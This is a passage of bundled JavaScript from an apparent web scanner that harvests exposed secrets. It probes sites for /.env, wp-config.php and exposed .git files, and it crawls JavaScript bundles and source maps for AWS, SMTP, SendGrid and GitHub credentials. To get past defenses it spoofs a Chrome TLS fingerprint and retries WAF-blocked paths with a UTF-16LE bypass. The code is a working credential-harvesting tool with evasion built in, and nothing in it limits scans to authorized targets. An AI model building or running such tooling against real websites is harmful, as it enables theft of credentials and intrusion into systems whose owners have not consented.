        logger.info("TLS", "curl-impersonate active (CURL_IMPERSONATE_BIN) \u2014 real JA3/JA4 Chrome");
        return new CurlImpersonateClient();
      }
      return new LazyHttpClient(undici, logger);
    }
  );
}
var LazyHttpClient;
var init_src = __esm({
  "packages/core/src/index.ts"() {
    "use strict";
    init_tokens();
    init_config_provider();
    init_dedup_store();
    init_event_bus();
    init_http_client();
    init_curl_impersonate_client();
    init_logger();
    init_container();
    init_tokens();
    init_module_registry();
    init_config_provider();
    init_dedup_store();
    init_event_bus();
    init_http_client();
    init_curl_impersonate_client();
    init_decode_body();
    init_is_unreachable();
    init_logger();
    init_normalize();
    init_waf_bypass();
    init_aws_secret();
    init_next_actions();
    init_semaphore();
    LazyHttpClient = class {
      constructor(_undici, _logger) {
        this._undici = _undici;
        this._logger = _logger;
      }
      _undici;
      _logger;
      _inner = null;
      _resolving = null;
      resolve() {
        if (this._inner) return Promise.resolve(this._inner);
        if (this._resolving) return this._resolving;
        this._resolving = hasCurlImpersonate().then((has) => {
          if (has) {
            this._logger.info("TLS", "curl-impersonate found in PATH \u2014 real JA3/JA4 Chrome active");
            this._inner = new CurlImpersonateClient();
          } else {
            this._logger.warn("TLS", "curl-impersonate not found \u2014 undici active (Node.js TLS fingerprint)");
            this._logger.warn("TLS", "Set CURL_IMPERSONATE_BIN or install: https://github.com/lwthiker/curl-impersonate");
            this._inner = this._undici;
          }
          return this._inner;
        });
        return this._resolving;
      }
      async get(url, options) {
        return (await this.resolve()).get(url, options);
      }
      async post(url, options) {
        return (await this.resolve()).post(url, options);
      }
    };
  }
});

// packages/content-analyzer/src/patterns.ts
function toRegex(p) {
  if (typeof p === "string") {
    let source2 = p;
    let flags2 = "g";
    if (source2.startsWith("(?i)")) {
      source2 = source2.slice(4);
      flags2 = "gi";
    }
    return { re: new RegExp(source2, flags2), name: p.slice(0, 48) };
  }
  let source = p.source;
  let flags = p.flags ?? "g";
  if (source.startsWith("(?i)")) {
    source = source.slice(4);
    if (!flags.includes("i")) flags += "i";
    if (!flags.includes("g")) flags += "g";
  }
  return { re: new RegExp(source, flags), name: p.name ?? p.source.slice(0, 48) };
}
function compileAwsSecretFinders(keywords) {
  const out = [];
  for (const raw of keywords) {
    const kw = raw.trim();
    if (!kw) continue;
    const lower = kw.toLowerCase();
    if (/(recaptcha|captcha|turnstile|sitekey|site_key|access_key_id)/.test(lower)) continue;
    if (lower === "accesskeyid" || lower === "access_key") continue;
    try {
      const escaped = kw.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      out.push({
        kw,
        re: new RegExp(`${escaped}\\s*[:="']+\\s*["']?([A-Za-z0-9/+=]{40})["']?(?![A-Za-z0-9/+=])`, "gi")
      });
    } catch {
    }
  }
  return out;
}
function compilePatternSets(file) {
  const credentials = [];
  const awsKeywords = [];
  for (const [service, group] of Object.entries(file.credentials ?? {})) {
    if (service === "aws" && group.proximityKeywords?.length) {
      awsKeywords.push(...group.proximityKeywords);
    }
    for (const p of group.patterns ?? []) {
      try {
        const { re, name } = toRegex(p);
        credentials.push({ service, name, re });
      } catch {
      }
    }
    for (const p of group.hostPatterns ?? []) {
      try {
        const { re, name } = toRegex(p);
        credentials.push({ service: `${service}.host`, name, re });
      } catch {
      }
    }
  }
  const discovery = {};
  for (const [key, list] of Object.entries(file.discovery ?? {})) {
    discovery[key] = [];
    for (const p of list) {
      try {
        discovery[key].push(toRegex(p).re);
      } catch {
      }
    }
  }
  return { credentials, discovery, awsSecretFinders: compileAwsSecretFinders(awsKeywords) };
}
function extractWithCompiled(content, compiled) {
  const matches = [];
  const seen = /* @__PURE__ */ new Set();
  for (const pat of compiled.credentials) {
    pat.re.lastIndex = 0;
    let m;
    const re = pat.re.global ? pat.re : new RegExp(pat.re.source, pat.re.flags.includes("g") ? pat.re.flags : pat.re.flags + "g");
    while (m = re.exec(content)) {
      const value = (m[1] ?? m[0]).trim();
      if (!value || value.length < 4) continue;
      const key = `${pat.service}:${value}`;
      if (seen.has(key)) continue;
      seen.add(key);
      const idx = m.index;
      const lineNumber = content.slice(0, idx).split("\n").length;
      const start = Math.max(0, idx - 80);
      const matchLen = m[0]?.length ?? value.length;
      const after = pat.service.split(".")[0] === "smtp" ? 2e3 : 80;
      const context = content.slice(start, idx + matchLen + after).replace(/\s+/g, " ");
      matches.push({
        service: pat.service.split(".")[0],
        value,
        context,
        lineNumber,
        patternName: pat.name
      });
      if (matches.length > 500) break;
    }
  }
  pairAwsSecrets(content, matches, seen, compiled.awsSecretFinders ?? []);
  return matches;
}
function searchSecretIn(text, finders) {
  for (const f of finders) {
    f.re.lastIndex = 0;
    let m;
    while (m = f.re.exec(text)) {
      const candidate = (m[1] ?? "").trim();
      if (isValidAwsSecretKey(candidate)) return { value: candidate, kw: f.kw };
    }
  }
  return null;
}
function pairAwsSecrets(content, matches, seen, finders) {
  if (!finders.length) return;
  const akias = matches.filter((m) => m.service === "aws" && isAwsAccessKey(m.value));
  if (!akias.length) return;
  for (const akia of akias) {
    const pos = content.indexOf(akia.value);
    if (pos < 0) continue;
    const start = Math.max(0, pos - 500);
    const end = Math.min(content.length, pos + akia.value.length + 500);
    const found = searchSecretIn(content.slice(start, end), finders) ?? searchSecretIn(content, finders);
    if (!found) continue;
    const key = `aws:${found.value}`;
    if (seen.has(key)) continue;
    seen.add(key);
    matches.push({
      service: "aws",
      value: found.value,
      context: akia.context,
      lineNumber: akia.lineNumber,
      patternName: `aws.secret.near:${found.kw}`
    });
  }
}
function applyDiscovery(content, compiled, key) {
  const out = [];
  for (const re of compiled.discovery[key] ?? []) {
    re.lastIndex = 0;
    const g = re.global ? re : new RegExp(re.source, re.flags + "g");
    let m;
    while (m = g.exec(content)) {
      const v = (m[1] ?? m[0]).trim();
      if (v) out.push(v);
    }
  }
  return out;
}
var init_patterns = __esm({
  "packages/content-analyzer/src/patterns.ts"() {
    "use strict";
    init_src();
  }
});

// packages/content-analyzer/src/waf.ts
function isWAFPage(content) {
  if (!content) return false;
  const head = content.slice(0, 4e3);
  let hits = 0;
  for (const re of WAF_MARKERS) {
    if (re.test(head)) hits++;
    if (hits >= 2) return true;
  }
  if (/<title>\s*(access denied|access to this page has been denied|attention required)/i.test(head)) {
    return true;
  }
  return false;
}
var WAF_MARKERS;
var init_waf = __esm({
  "packages/content-analyzer/src/waf.ts"() {
    "use strict";
    WAF_MARKERS = [
      /attention required/i,
      /cloudflare/i,
      /cf-ray/i,
      /checking your browser/i,
      /just a moment/i,
      /akamai/i,
      /access denied/i,
      /incapsula/i,
      /imperva/i,
      /sucuri/i,
      /request blocked/i,
      /why_captcha/i,
      /_incapsula_resource/i,
      /pardon our interruption/i,
      /bot detection/i,
      /ddos-guard/i
    ];
  }
});

// packages/content-analyzer/src/false-positives.ts
function isFalsePositive(m) {
  const v = m.value.trim();
  if (v.length < 6 && m.service !== "aws") return true;
  for (const re of PLACEHOLDERS) {
    if (re.test(v)) return true;
  }
  if (/lorem ipsum/i.test(m.context)) return true;
  if (m.service === "smtp" && SMTP_JS_PROP.test(m.context) && !/=/.test(m.context)) return true;
  if ((m.service === "smtp" || m.service === "smtp.host") && SMTP_JS_HOST.test(v) && /\.(value|target|type|password|username|current|props|state)$/i.test(v)) {
    return true;
  }
  if (m.service === "sendgrid" && !/^SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}$/.test(v)) return true;
  if (m.service === "aws" || m.service === "aws.secret") {
    if (isAwsAccessKey(v)) return false;
    if (!isValidAwsSecretKey(v)) return true;
  }
  if (m.service === "github" || m.service === "gitlab" || m.service === "bitbucket" || m.service === "gitbucket") {
    if (v.length < 16) return true;
    if (/^\$\{\{/.test(v) || /^secrets\./i.test(v)) return true;
    if (/^(null|changeme|your-?token|your_token|github_token)$/i.test(v)) return true;
  }
  if (m.service === "mandrill") {
    if (!/[0-9]/.test(v)) return true;
    if ((v.match(/-/g) ?? []).length >= 3) return true;
    if (/(flex|align|start|margin|padding|justify|hidden|block|grid)/i.test(v)) return true;
    if (/class\s*=/i.test(m.context)) return true;
  }
  if (/["']\s*:\s*["'][^"']{0,8}["']/.test(m.context) && v.length < 12) return true;
  return false;
}
var PLACEHOLDERS, SMTP_JS_PROP, SMTP_JS_HOST;
var init_false_positives = __esm({
  "packages/content-analyzer/src/false-positives.ts"() {
    "use strict";
    init_src();
    PLACEHOLDERS = [
      /^(xxx+|your[_-]?key|changeme|placeholder|example|sample|todo|insert|dummy)/i,
      /example\.com/i,
      /akidEXAMPLE/i,
      /wjalrXUtnFEMI\/K7MDENG/i,
      /^0+$/,
      /^[xX*]{8,}$/
    ];
    SMTP_JS_PROP = /\b(?:this|window|module|exports|o|e|t|n|r|a|P|m)\.(smtp|host|user|pass|target|value|email|password)\b/i;
    SMTP_JS_HOST = /^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)+$/;
  }
});

// packages/content-analyzer/src/payloads.ts
function extractScriptById(html, id) {
  for (const q of [`"`, `'`]) {
    const marker = `id=${q}${id}${q}`;
    const idx = html.indexOf(marker);
    if (idx < 0) continue;
    const openEnd = html.indexOf(">", idx);
    if (openEnd < 0) continue;
    const close = html.indexOf("</script>", openEnd);
    if (close < 0) continue;
    const raw = html.slice(openEnd + 1, close).trim();
    if (raw.startsWith("{") || raw.startsWith("[")) return raw;
  }
  return null;
}
function extractWindowVar(html, name) {
  const re = new RegExp(`window\\.${name}\\s*=\\s*`, "g");
  const m = re.exec(html);
  if (!m) return null;
  const start = m.index + m[0].length;
  const slice = html.slice(start, start + 5e5);
  const first = slice.trim()[0];
  if (first !== "{" && first !== "[") return null;
  return takeJsonish(slice);
}
function takeJsonish(s) {
  const startChar = s.trim()[0];
  const open = startChar;
  const close = open === "{" ? "}" : "]";
  let depth = 0;
  let inStr = null;
  let esc2 = false;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (inStr) {
      if (esc2) {
        esc2 = false;
        continue;
      }
      if (c === "\\") {
        esc2 = true;
        continue;
      }
      if (c === inStr) inStr = null;
      continue;
    }
    if (c === '"' || c === "'") {
      inStr = c;
      continue;
    }
    if (c === open) depth++;
    else if (c === close) {
      depth--;
      if (depth === 0) return s.slice(0, i + 1);
    }
  }
  return null;
}
function extractJSONPayloads(html) {
  const out = [];
  for (const id of SCRIPT_IDS) {
    const raw = extractScriptById(html, id);
    if (!raw) continue;
    try {
      out.push({ name: id, json: JSON.parse(raw), raw });
    } catch {
      out.push({ name: id, json: null, raw });
    }
  }
  for (const name of WINDOW_VARS) {
    const raw = extractWindowVar(html, name);
    if (!raw) continue;
    try {
      out.push({ name, json: JSON.parse(raw), raw });
    } catch {
      out.push({ name, json: null, raw });
    }
  }
  return out;
}
var SCRIPT_IDS, WINDOW_VARS;
var init_payloads = __esm({
  "packages/content-analyzer/src/payloads.ts"() {
    "use strict";
    SCRIPT_IDS = ["__NEXT_DATA__", "__NUXT_DATA__"];
    WINDOW_VARS = [
      "__NUXT__",
      "__APP_DATA__",
      "__INITIAL_STATE__",
      "__INITIAL_DATA__",
      "__PRELOADED_STATE__",
      "__RUNTIME_CONFIG__",
      "__ENV__",
      "__CONFIG__"
    ];
  }
});

// packages/content-analyzer/src/sourcemap.ts
function extractSourceMapRefs(jsContent) {
  const out = [];
  MAP_REF.lastIndex = 0;
  let m;
  while (m = MAP_REF.exec(jsContent)) {
    const ref = m[1].trim().replace(/["']+$/, "");
    if (ref.startsWith("data:")) continue;
    out.push(ref);
  }
  return out;
}
function parseSourceMapV3(json7) {
  const trimmed = json7.trim();
  if (!trimmed.startsWith("{")) return [];
  let parsed;
  try {
    parsed = JSON.parse(trimmed);
  } catch {
    return [];
  }
  if (parsed.version !== 3 || !Array.isArray(parsed.sourcesContent)) return [];
  const files = parsed.sources ?? [];
  const out = [];
  for (let i = 0; i < parsed.sourcesContent.length; i++) {
    const content = parsed.sourcesContent[i];
    if (!content || content.length > 512 * 1024) continue;
    out.push({ file: files[i] ?? `source-${i}`, content });
  }
  return out;
}
var MAP_REF;
var init_sourcemap = __esm({
  "packages/content-analyzer/src/sourcemap.ts"() {
    "use strict";
    MAP_REF = /(?:\/\/[#@]\s*sourceMappingURL\s*=\s*)(\S+)/g;
  }
});

// packages/content-analyzer/src/archives.ts
import AdmZip from "adm-zip";
import { gunzipSync as gunzipSync2 } from "node:zlib";
function extractArchives(content) {
  const buf = Buffer.isBuffer(content) ? content : Buffer.from(content);
  const out = [];
  if (buf.length >= 4 && buf[0] === 80 && buf[1] === 75 && buf[2] === 3 && buf[3] === 4) {
    try {
      const zip = new AdmZip(buf);
      for (const entry of zip.getEntries()) {
        if (entry.isDirectory) continue;
        if (out.length >= MAX_FILES) break;
        const data = entry.getData();
        if (data.length > MAX_FILE_BYTES) continue;
        out.push({ name: entry.entryName, content: data });
      }
    } catch {
    }
  }
  if (buf.length >= 2 && buf[0] === 31 && buf[1] === 139) {
    try {
      const inflated = gunzipSync2(buf);
      if (inflated.length <= MAX_FILE_BYTES) {
        out.push({ name: "archive.gz", content: inflated });
      }
    } catch {
    }
  }
  return out;
}
var MAX_FILES, MAX_FILE_BYTES;
var init_archives = __esm({
  "packages/content-analyzer/src/archives.ts"() {
    "use strict";
    MAX_FILES = 40;
    MAX_FILE_BYTES = 512 * 1024;
  }
});

// packages/content-analyzer/src/analyzer.ts
import { brotliDecompressSync as brotliDecompressSync2, gunzipSync as gunzipSync3, inflateSync as inflateSync2, inflateRawSync as inflateRawSync2 } from "node:zlib";
var HTML_HINT, ContentAnalyzer;
var init_analyzer = __esm({
  "packages/content-analyzer/src/analyzer.ts"() {
    "use strict";
    init_patterns();
    init_waf();
    init_false_positives();
    init_payloads();
    init_sourcemap();
    init_archives();
    init_src();
    init_waf();
    init_archives();
    init_sourcemap();
    init_payloads();
    HTML_HINT = /<!DOCTYPE\s+html|<html[\s>]|<head[\s>]|<body[\s>]/i;
    ContentAnalyzer = class {
      compiled;
      constructor(config) {
        this.compiled = compilePatternSets(config.patterns());
      }
      analyze(input) {
        let text;
        try {
          if (Buffer.isBuffer(input.content)) {
            text = this.decompress(input.content, input.contentEncoding);
          } else {
            text = this.normalizeText(input.content);
          }
        } catch {
          text = Buffer.isBuffer(input.content) ? input.content.toString("utf8") : String(input.content);
        }
        text = this.normalizeText(text);
        if (this.isWAFPage(text)) {
          return {
            text,
            rejected: true,
            rejectReason: "waf",
            matches: [],
            archives: [],
            payloads: [],
            sourceMapRefs: []
          };
        }
        const archives = this.extractArchives(Buffer.isBuffer(input.content) ? input.content : Buffer.from(text));
        const payloads = this.isHTML(text) ? this.extractJSONPayloads(text) : [];
        const sourceMapRefs = this.extractSourceMapRefs(text);
        const bodies = [text, ...payloads.map((p) => p.raw), ...archives.map((a) => a.content.toString("utf8"))];
        let matches = [];
        for (const body of bodies) {
          matches.push(...this.extractWithPatterns(body));
        }
        matches = this.filterFalsePositives(matches);
        if (isVendorSecretPath(input.path)) matches = [];
        return { text, rejected: false, matches, archives, payloads, sourceMapRefs };
      }
      detectEncoding(buffer) {
        if (buffer.length >= 3 && buffer[0] === 239 && buffer[1] === 187 && buffer[2] === 191) return "utf8-bom";
        if (buffer.length >= 2 && buffer[0] === 31 && buffer[1] === 139) return "gzip";
        if (buffer.length >= 2 && buffer[0] === 120 && (buffer[1] === 1 || buffer[1] === 156 || buffer[1] === 218)) {
          return "zlib";
        }
        if (buffer.length >= 4 && buffer[0] === 80 && buffer[1] === 75 && buffer[2] === 3 && buffer[3] === 4) {
          return "zip";
        }
        return "utf8";
      }
      decompress(input, hint) {
        const enc = (hint ?? this.detectEncoding(input)).toLowerCase();
        try {
          if (enc.includes("gzip") || enc === "gzip") return gunzipSync3(input).toString("utf8");
          if (enc.includes("br") || enc.includes("brotli")) return brotliDecompressSync2(input).toString("utf8");
          if (enc.includes("deflate") || enc === "zlib") {
            try {
              return inflateSync2(input).toString("utf8");
            } catch {
              return inflateRawSync2(input).toString("utf8");
            }
          }
        } catch {
        }
        return input.toString("utf8");
      }
      extractArchives(content) {
        return extractArchives(content);
      }
      normalizeText(raw) {
        return raw.replace(/^\uFEFF/, "").replace(/\r\n/g, "\n");
      }
      isWAFPage(content) {
        return isWAFPage(content);
      }
      isHTML(content) {
        const head = content.slice(0, 800);
        return HTML_HINT.test(head);
      }
      isLikelySecretFile(content, _path) {
        return !this.isHTML(content);
      }
      extractWithPatterns(content) {
        return extractWithCompiled(content, this.compiled);
      }
      extractEnvKeyValues(content) {
        const out = {};
        const re = /^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*$/gm;
        let m;
        while (m = re.exec(content)) {
          let v = m[2].trim();
          if (v.startsWith('"') && v.endsWith('"') || v.startsWith("'") && v.endsWith("'")) {
            v = v.slice(1, -1);
          }
          out[m[1]] = v;
        }
        return out;
      }
      extractJSONPayloads(html) {
        return extractJSONPayloads(html);
      }
      extractSourceMapRefs(jsContent) {
        return extractSourceMapRefs(jsContent);
      }
      parseSourceMapV3(json7) {
        return parseSourceMapV3(json7);
      }
      filterFalsePositives(matches) {
        return matches.filter((m) => !isFalsePositive(m));
      }
    };
  }
});

// packages/content-analyzer/src/index.ts
var init_src2 = __esm({
  "packages/content-analyzer/src/index.ts"() {
    "use strict";
    init_analyzer();
    init_patterns();
    init_waf();
    init_archives();
    init_sourcemap();
    init_payloads();
    init_analyzer();
  }
});

// packages/engine-paths/src/index.ts
var src_exports = {};
__export(src_exports, {
  PathsModule: () => PathsModule,
  default: () => src_default
});
function looksLive(status, body, analyzer, path) {
  if (![200, 201, 401, 403].includes(status)) return false;
  if (analyzer.isHTML(body)) return false;
  return analyzer.isLikelySecretFile(body, path);
}
var CANARIES, PathsModule, src_default;
var init_src3 = __esm({
  "packages/engine-paths/src/index.ts"() {
    "use strict";
    init_src();
    CANARIES = ["/.env", "/config.json", "/wp-config.php", "/appsettings.json"];
    PathsModule = class {
      name = "paths";
      phase = "pre";
      requiresPage = false;
      constructor(deps) {
        this.http = deps.http;
        this.analyzer = deps.analyzer;
        this.config = deps.config;
        this.dedup = deps.dedup;
        this.logger = deps.logger;
        this.limiter = deps.pathLimiter;
      }
      http;
      analyzer;
      config;
      dedup;
      logger;
      limiter;
      isEnabled(config) {
        return config.modules.paths !== false;
      }
      async *scan(ctx) {
        const origin = ctx.origin;
        if (!this.dedup.checkAndMark("path-origin", origin)) return;
        const cfg = this.config.get();
        const allPaths = cfg.pathsToCheck.filter((p) => p.startsWith("/"));
        if (!allPaths.length) return;
        let finished = false;
        const state = { hostDead: false, catchAll: false, htmlHits: 0 };
        try {
          const total = allPaths.length;
          const listed = new Set(allPaths);
          const done = /* @__PURE__ */ new Set();
          let halfway = false;
          const notePath = (path) => {
            if (!listed.has(path)) return;
            done.add(path);
            if (!halfway && done.size >= Math.ceil(total / 2)) {
              halfway = true;
              ctx.onPathsHalfway?.();
            }
          };
          const canary = await this.canary(origin, ctx, notePath, state);
          for (const hit of canary.hits) yield hit;
          if (canary.skip) {
            this.logger.warn("PATHS", `skip host ${origin} (canary hard-fail)`);
            finished = true;
            return;
          }
          if (state.catchAll) {
            this.logger.warn("PATHS", `skip remaining paths ${origin} (html catch-all)`);
            finished = true;
            return;
          }
          const paths = allPaths.filter((p) => !canary.fetched.has(p));
          if (!paths.length) {
            finished = true;
            return;
          }
          const conc = cfg.concurrency.pathProbesPerHost;
          let i = 0;
          const workers = Array.from({ length: Math.min(conc, paths.length) }, async () => {
            const hits = [];
            while (i < paths.length) {
              if (ctx.signal.aborted || state.hostDead || state.catchAll) break;
              const path = paths[i++];
              const { hit, dead } = await this.probe(origin, path, ctx, state);
              notePath(path);
              if (dead) state.hostDead = true;
              if (hit) hits.push(hit);
            }
            return hits;
          });
          const groups = await Promise.all(workers);
          if (state.hostDead) {
            this.logger.warn("PATHS", `skip remaining paths ${origin} (host dead)`);
          } else if (state.catchAll) {
            this.logger.warn("PATHS", `skip remaining paths ${origin} (html catch-all)`);
          }
          for (const g of groups) {
            for (const h of g) yield h;
          }
          finished = !ctx.signal.aborted;
        } finally {
          if (!finished) this.dedup.unmark?.("path-origin", origin);
        }
      }
      async canary(origin, ctx, notePath, state) {
        const fetched = /* @__PURE__ */ new Set();
        const hits = [];
        const hard = await Promise.all(
          CANARIES.map(async (path) => {
            const { hit, dead, fetched: ok } = await this.probe(origin, path, ctx, state);
            notePath(path);
            if (ok) fetched.add(path);
            if (hit) hits.push(hit);
            return dead;
          })
        );
        return { skip: hard.filter(Boolean).length >= 3, hits, fetched };
      }
      async probe(origin, path, ctx, state) {
        const url = resolveUrl(origin + "/", path.replace(/^\//, "")) ?? origin + path;
        let release = () => {
        };
        try {
          release = this.limiter ? await this.limiter.acquire(ctx.signal) : () => {
          };
          const res = await this.http.get(url, { signal: ctx.signal, budget: "pathProbe" });
          if ((res.status === 200 || res.status === 201) && this.analyzer.isHTML(res.text)) {
            state.htmlHits += 1;
            if (state.htmlHits >= 3) state.catchAll = true;
          }
          if (res.status === 403 && this.analyzer.isWAFPage(res.text) && !ctx.signal.aborted) {
            const bypassPath = utf16leBypassPath(path);
            const bypassUrl = resolveUrl(origin + "/", bypassPath.replace(/^\//, "")) ?? origin + bypassPath;
            if (bypassUrl !== url) {
              try {
                const bypass = await this.http.get(bypassUrl, {
                  signal: ctx.signal,
                  budget: "pathProbe"
                });
                if (looksLive(bypass.status, bypass.text, this.analyzer, path)) {
                  const result2 = this.analyzer.analyze({
                    url: bypassUrl,
                    path,
                    content: bypass.text,
                    contentEncoding: bypass.headers["content-encoding"],
                    contentType: bypass.headers["content-type"]
                  });
                  if (!result2.rejected && result2.matches.length > 0) {
                    this.logger.info(
                      "PATHS",
                      `WAF bypass hit (utf16le) ${bypassUrl} (${result2.matches.length} match)`
                    );
                    return {
                      hit: {
                        source: "path",
                        url: bypassUrl,
                        origin,
                        path,
                        payloadType: "utf16le-bypass",
                        statusCode: bypass.status,
                        contentSnippet: result2.text.slice(0, 12e3),
                        matches: result2.matches
                      },
                      dead: false,
                      fetched: true
                    };
                  }
                }
              } catch {
              }
            }
            return { hit: null, dead: false, fetched: true };
          }
          if (!looksLive(res.status, res.text, this.analyzer, path)) {
            return { hit: null, dead: false, fetched: true };
          }
          const result = this.analyzer.analyze({
            url,
            path,
            content: res.text,
            contentEncoding: res.headers["content-encoding"],
            contentType: res.headers["content-type"]
          });
          if (result.rejected || result.matches.length === 0) {
            return { hit: null, dead: false, fetched: true };
          }
          this.logger.info("PATHS", `hit ${url} (${result.matches.length} match)`);
          return {
            hit: {
              source: "path",
              url,
              origin,
              path,
              statusCode: res.status,
              contentSnippet: result.text.slice(0, 12e3),
              matches: result.matches
            },
            dead: false,
            fetched: true
          };
        } catch (err) {
          return { hit: null, dead: isDeadHostError(err), fetched: false };
        } finally {
          release();
        }
      }
    };
    src_default = PathsModule;
  }
});

// packages/engine-js/src/index.ts
var src_exports2 = {};
__export(src_exports2, {
  JsModule: () => JsModule,
  default: () => src_default2,
  extractPageScriptRefs: () => extractPageScriptRefs
});
function extractPageScriptRefs(html, origin, compiled) {
  const found = [];
  if (compiled) {
    for (const k of ["scriptSrc", "jsImportRef", "nextStaticJS", "linkPreload"]) {
      found.push(...applyDiscovery(html, compiled, k));
    }
  }
  found.push(...matchAll(SCRIPT_SRC, html));
  found.push(...matchAll(LINK_PRELOAD, html).filter((h) => isJsHint(h)));
  found.push(...matchAll(NEXT_STATIC, html));
  const out = [];
  const seen = /* @__PURE__ */ new Set();
  for (const r of found) {
    const abs = resolveUrl(origin + "/", htmlUnescape(r));
    if (!abs || seen.has(abs)) continue;
    if (!isJsUrl(abs) && !abs.includes("/_next/static/") && !abs.includes("/chunks/")) continue;
    seen.add(abs);
    out.push(abs);
  }
  return out.slice(0, 64);
}
function matchAll(re, text) {
  const out = [];
  const g = re.global ? new RegExp(re.source, re.flags) : new RegExp(re.source, re.flags + "g");
  let m;
  while (m = g.exec(text)) out.push(m[1] ?? m[0]);
  return out;
}
function htmlUnescape(s) {
  return s.replace(/&amp;/g, "&").replace(/&quot;/g, '"').replace(/&#39;/g, "'");
}
function isJsUrl(u) {
  return /\.(js|mjs|cjs)(\?|$)/i.test(u) || u.includes("/_next/static/");
}
function isJsHint(href) {
  const lc = href.toLowerCase();
  return lc.includes(".js") || lc.includes("/static/") || lc.includes("/chunks/") || lc.includes("as=script");
}
var SCRIPT_SRC, LINK_PRELOAD, NEXT_STATIC, QUOTED_JS, JS_CONCURRENCY, JsModule, src_default2;
var init_src4 = __esm({
  "packages/engine-js/src/index.ts"() {
    "use strict";
    init_src();
    init_src2();
    SCRIPT_SRC = /<script[^>]+src\s*=\s*["']?([^"'\s>]+)["']?/gi;
    LINK_PRELOAD = /<link[^>]+rel\s*=\s*["'](?:modulepreload|preload|prefetch)["'][^>]+href\s*=\s*["']([^"']+)["']/gi;
    NEXT_STATIC = /(\/_next\/static\/[^"'\\\s>]+\.(?:js|mjs))/g;
    QUOTED_JS = /["']([^"'\\\s]{1,500}\.(?:js|mjs|cjs)(?:[?#][^"'\\\s]*)?)["']/gi;
    JS_CONCURRENCY = 8;
    JsModule = class {
      name = "js";
      phase = "content";
      requiresPage = true;
      constructor(deps) {
        this.http = deps.http;
        this.analyzer = deps.analyzer;
        this.config = deps.config;
        this.dedup = deps.dedup;
        this.logger = deps.logger;
        this.compiled = compilePatternSets(deps.config.patterns());
      }
      http;
      analyzer;
      config;
      dedup;
      logger;
      compiled;
      isEnabled(config) {
        return config.modules.js !== false;
      }
      async *scan(ctx) {
        if (!ctx.pageContent) return;
        const id = scanIdentity(ctx.rawUrl, ctx.origin);
        if (!this.dedup.checkAndMark("js", id)) return;
        const compiled = this.compiled;
        const refs = extractPageScriptRefs(ctx.pageContent, ctx.origin, compiled);
        if (!refs.length) return;
        const cfg = this.config.get();
        const maxDepth = cfg.concurrency.jsCrawlDepth;
        const maxScripts = cfg.concurrency.jsMaxScripts;
        const seen = /* @__PURE__ */ new Set();
        const queue = refs.map((url) => ({ url, depth: 0 }));
        let scanned = 0;
        while (queue.length && scanned < maxScripts && !ctx.signal.aborted) {
          const batch = queue.splice(0, JS_CONCURRENCY);
          const results = await Promise.all(batch.map((j) => this.fetchScript(j.url, ctx)));
          for (let i = 0; i < results.length; i++) {
            const body = results[i];
            const job = batch[i];
            if (!body || seen.has(job.url)) continue;
            seen.add(job.url);
            scanned++;
            const analyzed = this.analyzer.analyze({
              url: job.url,
              content: body,
              contentType: "application/javascript"
            });
            if (!analyzed.rejected && analyzed.matches.length) {
              yield {
                source: "js",
                url: ctx.rawUrl,
                origin: ctx.origin,
                scriptUrl: job.url,
                contentSnippet: analyzed.text.slice(0, 1500),
                matches: analyzed.matches
              };
            }
            for (const mapRef of analyzed.sourceMapRefs) {
              const mapUrl = resolveUrl(job.url, mapRef);
              if (!mapUrl || mapUrl.startsWith("data:")) continue;
              const mapHit = await this.scanMap(mapUrl, ctx);
              if (mapHit) yield mapHit;
            }
            const stripped = job.url.replace(/[?#].*$/, "");
            const fallbackMap = `${stripped}.map`;
            if (!analyzed.sourceMapRefs.length) {
              const mapHit = await this.scanMap(fallbackMap, ctx);
              if (mapHit) yield mapHit;
            }
            if (job.depth < maxDepth) {
              const nested = [
                ...applyDiscovery(analyzed.text, compiled, "jsImportRef"),
                ...matchAll(QUOTED_JS, analyzed.text)
              ];
              for (const n of nested) {
                const abs = resolveUrl(job.url, n);
                if (!abs || seen.has(abs) || !sameHost(abs, ctx.origin)) continue;
                if (!isJsUrl(abs)) continue;
                queue.push({ url: abs, depth: job.depth + 1 });
              }
            }
          }
        }
        this.logger.info("JS", `crawled ${scanned} scripts on ${ctx.origin}`);
      }
      async fetchScript(url, ctx) {
        try {
          const res = await this.http.get(url, { signal: ctx.signal, budget: "jsFetch" });
          if (res.status !== 200) return null;
          if (this.analyzer.isWAFPage(res.text)) return null;
          if (this.analyzer.isHTML(res.text) && res.text.length > 400) return null;
          return res.text;
        } catch {
          return null;
        }
      }
      async scanMap(mapUrl, ctx) {
        if (!this.dedup.checkAndMark("map", mapUrl)) return null;
        try {
          const res = await this.http.get(mapUrl, { signal: ctx.signal, budget: "jsFetch" });
          if (res.status !== 200 || res.text.trim()[0] !== "{") return null;
          const sources = this.analyzer.parseSourceMapV3(res.text);
          const matches = [];
          for (const s of sources) {
            const a = this.analyzer.analyze({ url: mapUrl, path: s.file, content: s.content });
            if (!a.rejected) matches.push(...a.matches);
          }
          if (!matches.length) return null;
          return { source: "sourcemap", url: ctx.rawUrl, origin: ctx.origin, mapUrl, matches };
        } catch {
          return null;
        }
      }
    };
    src_default2 = JsModule;
  }
});

// packages/engine-git/src/git-objects.ts
import { inflateSync as inflateSync3 } from "node:zlib";
import { createHash as createHash2 } from "node:crypto";
function isValidSha(s) {
  return /^[a-f0-9]{40}$/.test(s);
}
function gitLooksExposed(path, body) {
  const t = body.trim();
  if (!t) return false;
  if (path.endsWith("/config") || path.endsWith("config")) return t.includes("[core]");
  if (path.endsWith("/HEAD") || path.endsWith("HEAD")) {
    return t.startsWith("ref:") || isValidSha(t.split(/\s/)[0] ?? "");
  }
  if (path.endsWith("/.git") || path.endsWith("/.git/")) {
    return t.includes("HEAD") || t.includes("config");
  }
  return false;
}
function extractGitRefs(content) {
  const refs = [];
  for (const m of content.matchAll(gitRefsRe)) {
    refs.push(m[0]);
    refs.push(`logs/${m[0]}`);
  }
  return refs;
}
function extractShas(content) {
  return content.match(gitSHARe) ?? [];
}
function extractGitHrefs(html) {
  const out = [];
  gitHrefRe.lastIndex = 0;
  let m;
  while (m = gitHrefRe.exec(html)) {
    const href = m[1].trim();
    if (href && !href.startsWith("?") && !href.startsWith("#")) out.push(href);
  }
  return out;
}
function parseGitIndex(buf) {
